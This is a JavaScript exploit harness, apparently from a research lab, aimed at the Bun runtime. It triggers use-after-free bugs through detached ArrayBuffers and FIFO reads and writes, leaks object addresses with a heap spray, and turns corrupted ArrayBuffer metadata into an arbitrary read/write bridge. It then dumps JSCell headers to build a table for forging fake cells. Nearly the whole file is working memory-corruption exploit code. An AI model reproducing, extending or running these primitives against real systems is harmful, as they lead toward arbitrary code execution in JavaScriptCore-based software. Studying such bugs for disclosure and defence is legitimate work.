// Use the existing no-FFI addrof + ArrayBuffer-metadata bridge to recover the
// first 32 bytes of an attacker-chosen JSCell. Repeat across several templates
// in one run so we can compare structureID / typeInfoBlob bytes across
// JSCell kinds and produce a usable table for fake-cell construction.
//
// Built on:
//   * lab/harnesses/13-arb-rw-probes/object-bridge-addrof-probe.js
//   * lab/harnesses/13-arb-rw-probes/addrof-arraybuffer-metadata-arw-bridge.js
//
// Strategy: do the two-stage bridge setup ONCE, then loop over templates
// retargeting only the metadata's data-pointer field. Each addrof is its own
// 8KB-UAF cycle, but the 128-byte bridge stays put for all templates. We
// restore the metadata pointer between templates so the victimBuffer survives
// teardown.
//
// No bun:ffi, no native helper dylib, no symbol lookup, no JIT warming.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const addrofSize = Number(process.env.ADDROF_SIZE || 8192);
const addrofSlots = Number(process.env.ADDROF_SLOTS || 1024);
const addrofSprayCount = Number(process.env.ADDROF_SPRAY_COUNT || 4096);
const addrofElementOffset = Number(process.env.ADDROF_ELEMENT_OFFSET || 144);
const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 16384);
const bridgeAttempts = Number(process.env.BRIDGE_ATTEMPTS || 64);
const writeOffset = Number(process.env.WRITE_OFFSET || 16);
const dataPtrOffset = Number(process.env.DATA_PTR_OFFSET || 16);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || (1 << 20));
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const lengthBytes = Number(process.env.LENGTH_BYTES || 32);

const templates = (process.env.TEMPLATES ||
  "plain,withProps,doubleArray,objectArray,arrayBuffer,uint8Array,float64Array,biguint64Array,dataView,regexp,function"
).split(",");

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}
function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}
function hex(value, width = 16) { return `0x${value.toString(16).padStart(width, "0")}`; }
function isPointerLike(v) {
  return v >= 0x0000100000000000n && v <= 0x00007ffffffffffen && (v & 0x7n) === 0n;
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-cell-harvest-${label}-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mk.status !== 0) throw new Error(`mkfifo: ${mk.status}`);
  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}
function closeFifo(f) {
  for (const fd of [f.writeFd, f.fillFd, f.readFd]) { try { fs.closeSync(fd); } catch {} }
  try { fs.unlinkSync(f.path); } catch {}
}
function isAgain(e) { return e?.code === "EAGAIN" || e?.code === "EWOULDBLOCK"; }
function fillFifo(f) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const n = fs.writeSync(f.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (n === 0) break;
      filled += n;
    } catch (e) { if (isAgain(e)) break; throw e; }
  }
  if (filled === 0) throw new Error("fifo fill failed");
  return filled;
}
async function readExact(f, n, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, n)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;
  while (total < n) {
    try {
      const got = fs.readSync(f.readFd, scratch, 0, Math.min(scratch.length, n - total), null);
      if (got > 0) { chunks.push(Buffer.from(scratch.subarray(0, got))); total += got; continue; }
    } catch (e) { if (!isAgain(e)) throw e; }
    if (Date.now() >= deadline) throw new Error(`timed out ${label}`);
    await sleep(1);
  }
  return Buffer.concat(chunks, total);
}
function readU64LEBytes(buf, off) {
  let v = 0n;
  for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(buf[off + i]);
  return v;
}
function writeU64LE(view, off, value) {
  let v = value;
  for (let i = 0; i < 8; i++) { view[off + i] = Number(v & 0xffn); v >>= 8n; }
}
function payloadU64(value) {
  const out = Buffer.alloc(8);
  let v = value;
  for (let i = 0; i < 8; i++) { out[i] = Number(v & 0xffn); v >>= 8n; }
  return out;
}

async function addrof(target) {
  const fifo = makeFifo("addrof");
  const retained = [];
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(addrofSize);
    const source = new Uint8Array(ab);
    source.fill(0x51);
    const done = new Promise((r) => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bw) => r({ err, bw }));
    });
    detach(ab);
    gcNow();
    for (let i = 0; i < addrofSprayCount; i++) {
      const arr = new Array(addrofSlots);
      for (let j = 0; j < addrofSlots; j++) arr[j] = target;
      retained.push(arr);
    }
    gcNow();
    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, addrofSize, "addrof");
    await done;
    return readU64LEBytes(leaked, addrofElementOffset);
  } finally {
    closeFifo(fifo);
    retained.length = 0;
  }
}

let liveCarriers = []; // keep reference forever so the bridge stays alive

function makeCarriers() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const view = new Uint8Array(new ArrayBuffer(viewSize));
    view.fill((0x71 + (i & 15)) & 0xff);
    out.push(view);
  }
  return out;
}

async function corruptBridge(victimAddress) {
  const path = join(tmpdir(), `bun-cell-harvest-write-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mk.status !== 0) throw new Error(`mkfifo: ${mk.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);
  try {
    const ab = new ArrayBuffer(uafSize);
    const target = new Uint8Array(ab);
    target.fill(0x51);
    const done = new Promise((r) => {
      fs.read(fd, target, writeOffset, 8, null, (err, bytesRead) => r({ err, bytesRead }));
    });
    detach(ab);
    gcNow();
    const carriers = makeCarriers();
    liveCarriers.push(carriers);  // pin so the bridge stays valid
    gcNow();
    fs.writeSync(fd, payloadU64(victimAddress), 0, 8);
    await done;
    return carriers;
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

function findMetadataBridge(carriers) {
  for (let i = 0; i < carriers.length; i++) {
    const c = carriers[i];
    let fresh;
    try { fresh = new Uint8Array(c.buffer); } catch { continue; }
    if (fresh.length !== viewSize) continue;
    const expectedFill = (0x71 + (i & 15)) & 0xff;
    let differs = false;
    for (let k = 0; k < 8; k++) if (fresh[k] !== expectedFill) { differs = true; break; }
    if (differs) return { index: i, fresh, carrier: c };
  }
  return null;
}

function makeTemplate(kind) {
  switch (kind) {
    case "plain":          return {};
    case "withProps":      return { a: 1, b: 2, c: 3, d: 4, e: 5, f: 6 };
    case "doubleArray":    return [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
    case "objectArray":    return [{}, {}, {}, {}, {}, {}, {}, {}];
    case "arrayBuffer":    return new ArrayBuffer(64);
    case "uint8Array":     return new Uint8Array(64);
    case "float64Array":   return new Float64Array(8);
    case "biguint64Array": return new BigUint64Array(8);
    case "dataView":       return new DataView(new ArrayBuffer(64));
    case "regexp":         return /abc/;
    case "function":       return function () { return 42; };
    default: throw new Error(`unknown template ${kind}`);
  }
}

function parseHeader(prefix) {
  if (!prefix || prefix.length < 8) return null;
  const structureID = (prefix[0] | (prefix[1] << 8) | (prefix[2] << 16) | (prefix[3] << 24)) >>> 0;
  return {
    structureID: `0x${structureID.toString(16).padStart(8, "0")}`,
    indexingType: prefix[4],
    m_type: prefix[5],
    flags: prefix[6],
    cellState: prefix[7],
  };
}

// === Main ===

const victimBuffer = new ArrayBuffer(viewSize);
new Uint8Array(victimBuffer).fill(0xa0);

const victimAddr = await addrof(victimBuffer);
console.error(JSON.stringify({ phase: "victim-addrof", victimAddr: hex(victimAddr) }));

// Stage 1: bridge to victim's wrapper.
let bridge1 = null;
for (let attempt = 0; attempt < bridgeAttempts; attempt++) {
  const carriers = await corruptBridge(victimAddr);
  bridge1 = findMetadataBridge(carriers);
  if (bridge1) {
    console.error(JSON.stringify({ phase: "stage1", attempt, bridgeIndex: bridge1.index }));
    break;
  }
}
if (!bridge1) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "stage1 bridge not found" }));
  process.exit(1);
}

// Read the metadata object pointer at wrapper offset 16.
let metadataAddr = 0n;
for (let k = 7; k >= 0; k--) metadataAddr = (metadataAddr << 8n) | BigInt(bridge1.fresh[16 + k]);
console.error(JSON.stringify({ phase: "metadata-addr", metadataAddr: hex(metadataAddr) }));

if (!isPointerLike(metadataAddr)) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "metadata addr not pointer-like", metadataAddr: hex(metadataAddr) }));
  process.exit(1);
}

// Stage 2: bridge to metadata.
let bridge2 = null;
for (let attempt = 0; attempt < bridgeAttempts; attempt++) {
  const carriers = await corruptBridge(metadataAddr);
  bridge2 = findMetadataBridge(carriers);
  if (bridge2) {
    console.error(JSON.stringify({ phase: "stage2", attempt, bridgeIndex: bridge2.index }));
    break;
  }
}
if (!bridge2) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "stage2 bridge not found" }));
  process.exit(1);
}

// Capture original dataPtr from metadata so we can restore it.
const originalDataPtr = Buffer.alloc(8);
for (let i = 0; i < 8; i++) originalDataPtr[i] = bridge2.fresh[dataPtrOffset + i];
console.error(JSON.stringify({ phase: "original-dataptr", bytes: originalDataPtr.toString("hex") }));

// Verify the bridge works: read the victim's first byte before retargeting.
let preReadBaseline;
try { preReadBaseline = new Uint8Array(victimBuffer)[0]; } catch (e) { preReadBaseline = `throw:${e?.message}`; }
console.error(JSON.stringify({ phase: "pre-baseline", first: preReadBaseline }));

const out = [];
let allOk = true;
for (const kind of templates) {
  let target;
  try { target = makeTemplate(kind); } catch (e) {
    out.push({ template: kind, error: `make: ${e?.message}` });
    allOk = false;
    continue;
  }

  let templateAddr;
  try { templateAddr = await addrof(target); }
  catch (e) {
    out.push({ template: kind, error: `addrof: ${e?.message}` });
    allOk = false;
    continue;
  }
  if (!isPointerLike(templateAddr)) {
    out.push({ template: kind, targetAddr: hex(templateAddr), error: "addrof not pointer-like" });
    allOk = false;
    continue;
  }

  // Retarget metadata's data pointer to templateAddr.
  writeU64LE(bridge2.fresh, dataPtrOffset, templateAddr);

  let cellPrefix = null;
  let readError = null;
  try {
    const cellView = new Uint8Array(victimBuffer);
    cellPrefix = [...cellView.subarray(0, lengthBytes)];
  } catch (e) {
    readError = e?.message || String(e);
  }

  // Restore from saved bytes immediately.
  for (let i = 0; i < 8; i++) bridge2.fresh[dataPtrOffset + i] = originalDataPtr[i];

  const header = parseHeader(cellPrefix);
  const summary = {
    template: kind,
    targetAddr: hex(templateAddr),
    readError,
    header,
    cellPrefixHex: cellPrefix ? Buffer.from(cellPrefix).toString("hex") : null,
  };
  if (!header) allOk = false;
  out.push(summary);
  console.error(JSON.stringify(summary));
}

console.log(JSON.stringify({ phase: "summary", ok: allOk, victimAddr: hex(victimAddr), metadataAddr: hex(metadataAddr), results: out }, null, 2));
process.exitCode = allOk ? 86 : 1;
